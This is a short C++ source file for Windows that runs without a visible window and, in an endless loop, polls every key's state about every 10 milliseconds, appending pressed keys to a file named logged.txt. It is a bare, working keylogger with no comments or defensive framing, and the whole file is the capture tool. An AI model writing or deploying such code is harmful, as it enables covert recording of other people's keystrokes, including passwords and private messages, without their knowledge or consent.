#include <Windows.h>
#include <fstream>
#include <thread>
#include <chrono>

#define INTERVAL 10

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	std::ofstream file("logged.txt", std::ios::trunc);
	while(true)
	{
		for(int i = 0; i < 255; i++)
		{
			const SHORT keyState = GetAsyncKeyState(i);
			if (keyState) {
				file << static_cast<char>(i) << std::endl;
			}
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(INTERVAL));
	}
	return 0;
}